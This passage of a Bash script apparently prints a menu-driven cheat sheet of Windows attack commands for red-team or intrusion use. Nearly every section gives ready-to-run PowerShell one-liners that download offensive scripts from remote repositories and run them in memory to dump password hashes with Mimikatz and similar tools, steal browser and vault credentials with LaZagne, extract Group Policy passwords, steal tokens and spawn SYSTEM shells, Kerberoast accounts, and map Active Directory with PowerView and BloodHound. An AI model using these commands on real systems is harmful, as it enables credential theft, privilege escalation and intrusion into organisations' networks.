echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::sam"\"'"
echo -e ""
echo -e "${IBLUE}Nishang${RESTORE}"
echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

Internal_Menu_Credential_Access_Credential_Manager(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}Credential Manager${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get-VaultCredential${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Exfiltration/Get-VaultCredential.ps1);Get-VaultCredential"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}Nishang${RESTORE}"
echo -e "$DownloadMethod "$NishangRepo"Gather/Get-WebCredentials.ps1);Get-WebCredentials"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Credential_Access_Credential_Group_Policy(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Group Policy${RESTORE}"
echo -e ""    
echo -e "${IBLUE}CMD${RESTORE}"
echo -ne "
findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
"
echo -e ""  
echo -e "${IBLUE}Get-CachedGPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Credential_Web_Browsers(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Web Browsers${RESTORE}"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}SharpWeb${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpweb.ps1);Invoke-Sharpweb -Command "\"full"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Unsecured_Credentials(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Unsecured Credentials Type



        1)  ->  [ Credentials in Files 		]
        2)  ->  [ Credentials in Registry	]
        
        Q)  ->	[Previous Menu			]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files ;;
	        2) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry ;;
	        q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Credentials in Files${RESTORE}"
echo -e ""
echo -e "${IBLUE}CMD${RESTORE}"
echo -e "findstr /si pass *.xml *.doc *.txt *.xls"
echo -e "findstr /si cred *.xml *.doc *.txt *.xls"
echo -e ""
echo -e "${IBLUE}Gopher${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Gopher.ps1);Invoke-Gopher"
echo -e ""
echo -e "${IBLUE}PowerShell${RESTORE}"
echo -e "ls -R | select-string -Pattern 'password'"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
echo -e ""
echo -e ""
echo -e "${IBLUE}SessionGopher${RESTORE}"
echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -Thorough"
echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -AllDomain -Thorough"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Credentials in Registry${RESTORE}"
echo -e ""
echo -e "${IBLUE}CMD${RESTORE}"
echo -e ""
echo -e "${YELLOW}String matching in registry${RESTORE}"
echo -e "reg query HKLM /f password /t REG_SZ /s"
echo -e "reg query HKCU /f password /t REG_SZ /s"
echo -e ""
echo -e "${YELLOW}Putty${RESTORE}"
echo -e "reg query "\"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"\" /t REG_SZ /s"
echo -e ""
echo -e "${YELLOW}VNC${RESTORE}"
echo -e "reg query "\"HKCU\\Software\\ORL\\WinVNC3\\Password"\""
echo -e ""
echo -e "${YELLOW}Windows autologin${RESTORE}"
echo -e "reg query "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"\""
echo -e ""
echo -e "${IBLUE}PowerShell${RESTORE}"
echo -e "ls -R | select-string -Pattern 'password'"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Recon(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Recon Type



        1)  ->  [ Domain Recon 		]
        2)  ->  [ File and Share Recon 	]
        3)  ->  [ Local Host Recon	] 
        4)  ->  [ Network Recon 	]
                 
        Q)  ->	[Previous Menu		]
"
        read a
        case $a in
	        1) 	Internal_Menu_Recon_Domain ;;
	        2) 	Internal_Menu_Recon_File_Share ;;
	        3) 	Internal_Menu_Recon_Local_Host;;
	        4) 	Internal_Menu_Recon_Network ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Token(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Token Manipulation tool Type



        1)  ->  [ Invoke-SharpImpersonation ${LYELLOW}WIP${RESTORE}]
        2)  ->  [ Invoke-TokenVator  ${LYELLOW}WIP${RESTORE}]
        
        Q)  ->	[Previous Menu		]
"
        read a
        case $a in
	        1) 	Internal_Menu_Token_SharpImpersonation ;;
	        2) 	Internal_Menu_Token_TokenVator ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Token_SharpImpersonation(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Invoke-SharpImpersonation${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load into memory${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpImpersonationNoSpace.ps1)"
echo -e ""
echo -e "${IBLUE}List tokens on current system${RESTORE}"
echo -e "Invoke-SharpImpersonation -Command "\"list\"""
echo -e "Invoke-SharpImpersonation -Command "\"list wmi"\""
echo -e ""
echo -e "${IBLUE}Attempt to impersonate user with first process found${RESTORE}"
echo -e "Invoke-SharpImpersonation -Command "\"user:[Domain\\User]"\""
echo -e ""
echo -e "${IBLUE}Inject directly into a process ID${RESTORE}"
echo -e "Invoke-SharpImpersonation -Command "\"pid:[PID]"\""
echo -ne "Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName" ; echo -e " ${YELLOW}# List PIDs and Users with PowerShell${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impersonate first process of target user to a custom binary path${RESTORE}"
echo -ne "Invoke-SharpImpersonation -Command "\"user:[Domain\\User] binary:powershell.exe"\"" ; echo -e " ${YELLOW}# Start PowerShell${RESTORE}"
echo -ne "Invoke-SharpImpersonation -Command "\"user:[Domain\\User] binary:cmd.exe"\"" ; echo -e " ${YELLOW}# Start CMD${RESTORE}"
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Token ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Token_TokenVator(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Invoke-TokenVator${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load into memory${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-TokenVator.ps1)"
echo -e ""
echo -e "${IBLUE}List tokens on current system (Sample)${RESTORE}"
echo -e "Invoke-Tokenvator -Command "\"Sample_Processes\"""
echo -e "Invoke-Tokenvator -Command "\"Sample_Processes_WMI\"""
echo -e ""
echo -e "${IBLUE}List user proceeses${RESTORE}"
echo -e "Invoke-Tokenvator -Command "\"Find_User_Processes\"""
echo -e "Invoke-Tokenvator -Command "\"Find_User_Processes_WMI\"""
echo -ne "Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName" ; echo -e " ${YELLOW}# List PIDs and Users with PowerShell${RESTORE}"
echo -e ""
echo -e "${IBLUE}Steal token from process ID${RESTORE}"
echo -e "Invoke-Tokenvator -Command "\"Steal_token [PID] powershell.exe\"""
echo -e "Invoke-Tokenvator -Command "\"Steal_token [PID] cmd.exe\"""
echo -e ""
echo -e "${IBLUE}Spawn a SYSTEM shell${RESTORE}"
echo -e "Invoke-Tokenvator -Command "\"GetSystem PowerShell.exe\"""
echo -e "Invoke-Tokenvator -Command "\"GetSystem cmd.exe\"""
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Token ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_Recon_Local_Host(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Local Host Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all | Out-file SbResults.txt"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Domain Recon Type



	1)  ->	[ Domain ACL's			]
	2)  -> 	[ Domain Controllers		]
        3)  ->  [ Domain Computers and Servers 	]
        4)  ->	[ Domain Delegation		]
        5)  ->	[ Domain Forests 		]
        6)  ->	[ Domain GPO's			]
        7)  ->	[ Domain Groups			]
        8)  -> 	[ Domain Policies 		]
        9)  ->	[ Domain Trusts 		]
        10) -> 	[ Domain Users 			]
        T)  ->  [ Tools				]
        
                
        Q)  ->	[Previous Menu		    	]
"
        read a
        case $a in
        	1) 	Internal_Menu_Recon_Domain_ACL ;;
        	2) 	Internal_Menu_Recon_Domain_Controllers ;;	
	        3) 	Internal_Menu_Recon_Domain_Computers_Servers ;;
	        4) 	Internal_Menu_Recon_Domain_Delegation ;;
	        5) 	Internal_Menu_Recon_Domain_Forests ;;
	        6) 	Internal_Menu_Recon_Domain_GPO ;;
	        7) 	Internal_Menu_Recon_Domain_Groups ;;
	        8) 	Internal_Menu_Recon_Domain_Policies ;;
	        9) 	Internal_Menu_Recon_Domain_Trusts ;;
	        10) 	Internal_Menu_Recon_Domain_Users ;;
	        t|T) 	Internal_Menu_Recon_Domain_Tools ;;
	        q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon_Domain_ACL(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain ACL's and ACE's${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
echo -e "Invoke-ACLScanner -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specific AD Object${RESTORE}"
echo -e "Get-ObjectACL -SamAccountName <SAM> -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
echo -e ""
echo -e "${IBLUE}Get the ACLs associated with the specified Path${RESTORE}"
echo -e "Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
echo -e ""
echo -e "" 

echo -ne  "Return to Previous Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Controllers(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Controller Enumeration${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "Get-NetDomainController"
echo -e "Get-NetDomain | Select-Object 'PdcRoleOwner'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

        
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Domain_Computers_Servers(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Computers and Servers${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}All Computers${RESTORE}"
echo -e "Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
echo -e ""
echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
echo -e "Get-DomainComputer -Ping"
echo -e ""
echo -e "${IBLUE}Computers by Operating System${RESTORE}"
echo -e "Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
echo -e "Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
echo -e ""
echo -e "${IBLUE}Servers by Operating System${RESTORE}"
echo -e "Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Delegation (){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Delegation${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Constrained Delegation${RESTORE}"
echo -e "Get-DomainComputer -TrustedToAuth"
echo -e "Get-DomainUser -TrustedToAuth"
echo -e ""
echo -e "${IBLUE}Unconstrained Delegation${RESTORE}"
echo -e "Get-DomainComputer -Unconstrained | select -ExpandProperty name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Forests(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Forests${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Get details about the current forest${RESTORE}"
echo -e "Get-NetForest"
echo -e ""
echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
echo -e "Get-NetForestDomain"
echo -e ""
echo -e "${IBLUE}Get global catalogs in current Forest${RESTORE}"
echo -e "Get-NetForestCatalog"
echo -e ""
echo -e "${IBLUE}Map Forest trusts${RESTORE}"
echo -e "Get-NetForestTrust"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_GPO() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain GPO's${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
echo -e "Get-DomainGPO"
echo -e "Get-DomainGPO | Select DisplayName"
echo -e ""
echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
echo -e "Get-DomainHPO -ADSpath ((Get-NetOU '[OU-Name]' -FullData).gplink.split(';')[0] -replace '^.')"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Groups() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Groups${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}List all Groups${RESTORE}"
echo -e "Get-NetGroup"
echo -e "Get-NetGroup | Select SamAccountName | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
echo -e "Get-NetGroup "\"*admin*"\""
echo -e "Get-NetGroup "\"*admin*"\" | Select SamAccountName | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
echo -e "Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
echo -e ""
echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
echo -e "Get-NetGroup Get-NetLocalGroup -Identity '<Username>'"
echo -e ""
echo -e "${IBLUE}Get all the effective members of a group${RESTORE}"
echo -e "Get-DomainGroupMember -Identity "\"Domain Admins"\" -Recurse | Select MemberName,GroupName,MemberObjectClass | Sort Name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Policies() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Policies${RESTORE}"
echo -e "" 
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Password Policy${RESTORE}"
echo -e "(Get-DomainPolicy).'SystemAccess'"
echo -e ""
echo -e "${IBLUE}Kerberos Policy${RESTORE}"
echo -e "(Get-DomainPolicy).'KerberosPolicy'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Trusts() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Trusts${RESTORE}"
echo -e "" 
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
echo -e "Get-NetForestDomain -Verbose | Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
echo -e "Get-DomainTrustMapping"
echo -e "Get-DomainTrustMapping | Select SourceName,TargetName,TrustType,TrustDirection"
echo -e ""
echo -e "${IBLUE}List external trusts${RESTORE}"
echo -e "Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "Get-DomainTrust"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "Find-ForeignUser"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Users(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Users${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
echo -e ""
echo -e "${IBLUE}Get User Properties${RESTORE}"
echo -e "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name"
echo -e "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties SamAccountName,Description | Sort SamAccountName"
echo -e "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
echo -e ""
echo -e "${IBLUE}Get Specific user account${RESTORE}"
echo -e "Get-NetUser -Identity '<Username>'"
echo -e ""
echo -e "${IBLUE}Get all users with passwords changed more than 3 years ago${RESTORE}"
echo -e "\$Date = (Get-Date).AddYears(-3).ToFileTime(); Get-DomainUser -LDAPFilter ""\"(pwdlastset<=\$Date)"\"" -Properties samaccountname,pwdlastset"
echo -e ""
echo -e "${IBLUE}Get all users with SPN set${RESTORE}"
echo -e "Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get all service accounts in "\"Domain Admins"\"${RESTORE}"
echo -e "Get-DomainUser -SPN | ?{\$_.memberof -match 'Domain Admins'} | Select SamAccountName | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get users with SID History set${RESTORE}"
echo -e "Get-DomainUser -LDAPFilter '(sidHistory=*)'"
echo -e ""
echo -e "${IBLUE}Kerberoastable users${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"kerberoast /nowrap"\""
echo -e ""
echo -e "${IBLUE}AS-REP Roastable users${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"asreproast /nowrap"\""
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Tools(){


	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Tools${RESTORE}"
echo -e ""
echo -e "${IBLUE}adPEAS${RESTORE}"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS.ps1);Invoke-adPEAS"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS-Light.ps1);Invoke-adPEAS"
echo -e ""
echo -e ""
echo -e "${IBLUE}BloodHound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}


Internal_Menu_Recon_Network(){

   	 clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>' | Out-File ArpScan.txt"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -TopPorts 1000 -Open -oA Scan.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"135,445"\" -Open -oA SMB.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"1433"\" -Open -oA MSSQL.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"80,443,8080"\" -Open -oA Web.txt"
echo -e ""
echo -e "${IBLUE}BloodHound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_File_Share() {

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}File and Share Enumeration${RESTORE}"
echo -e ""
